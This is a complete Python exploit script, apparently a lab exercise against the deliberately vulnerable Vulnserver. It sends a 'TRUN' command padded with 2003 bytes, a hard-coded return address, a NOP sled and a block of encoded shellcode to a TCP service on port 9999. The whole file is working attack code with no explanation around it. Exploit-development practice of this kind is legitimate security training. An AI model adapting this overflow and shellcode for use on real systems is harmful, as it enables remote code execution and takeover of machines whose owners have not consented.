#!/usr/bin/python
import sys, socket

overflow = (
"\xdd\xc6\xd9\x74\x24\xf4\x58\xbb\x30\xba\x27\x8f\x2b\xc9\xb1"
"\x52\x31\x58\x17\x83\xc0\x04\x03\x68\xa9\xc5\x7a\x74\x25\x8b"
"\x85\x84\xb6\xec\x0c\x61\x87\x2c\x6a\xe2\xb8\x9c\xf8\xa6\x34"
"\x56\xac\x52\xce\x1a\x79\x55\x67\x90\x5f\x58\x78\x89\x9c\xfb"
"\xfa\xd0\xf0\xdb\xc3\x1a\x05\x1a\x03\x46\xe4\x4e\xdc\x0c\x5b"
"\x7e\x69\x58\x60\xf5\x21\x4c\xe0\xea\xf2\x6f\xc1\xbd\x89\x29"
"\xc1\x3c\x5d\x42\x48\x26\x82\x6f\x02\xdd\x70\x1b\x95\x37\x49"
"\xe4\x3a\x76\x65\x17\x42\xbf\x42\xc8\x31\xc9\xb0\x75\x42\x0e"
"\xca\xa1\xc7\x94\x6c\x21\x7f\x70\x8c\xe6\xe6\xf3\x82\x43\x6c"
"\x5b\x87\x52\xa1\xd0\xb3\xdf\x44\x36\x32\x9b\x62\x92\x1e\x7f"
"\x0a\x83\xfa\x2e\x33\xd3\xa4\x8f\x91\x98\x49\xdb\xab\xc3\x05"
"\x28\x86\xfb\xd5\x26\x91\x88\xe7\xe9\x09\x06\x44\x61\x94\xd1"
"\xab\x58\x60\x4d\x52\x63\x91\x44\x91\x37\xc1\xfe\x30\x38\x8a"
"\xfe\xbd\xed\x1d\xae\x11\x5e\xde\x1e\xd2\x0e\xb6\x74\xdd\x71"
"\xa6\x77\x37\x1a\x4d\x82\xd0\xe5\x3a\x8d\xce\x8e\x38\x8d\x1f"
"\x13\xb4\x6b\x75\xbb\x90\x24\xe2\x22\xb9\xbe\x93\xab\x17\xbb"
"\x94\x20\x94\x3c\x5a\xc1\xd1\x2e\x0b\x21\xac\x0c\x9a\x3e\x1a"
"\x38\x40\xac\xc1\xb8\x0f\xcd\x5d\xef\x58\x23\x94\x65\x75\x1a"
"\x0e\x9b\x84\xfa\x69\x1f\x53\x3f\x77\x9e\x16\x7b\x53\xb0\xee"
"\x84\xdf\xe4\xbe\xd2\x89\x52\x79\x8d\x7b\x0c\xd3\x62\xd2\xd8"
"\xa2\x48\xe5\x9e\xaa\x84\x93\x7e\x1a\x71\xe2\x81\x93\x15\xe2"
"\xfa\xc9\x85\x0d\xd1\x49\xa5\xef\xf3\xa7\x4e\xb6\x96\x05\x13"
"\x49\x4d\x49\x2a\xca\x67\x32\xc9\xd2\x02\x37\x95\x54\xff\x45"
"\x86\x30\xff\xfa\xa7\x10"
)

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('0.0.0.0',9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close()

except:
    print("error connecting to server")
    sys.exit()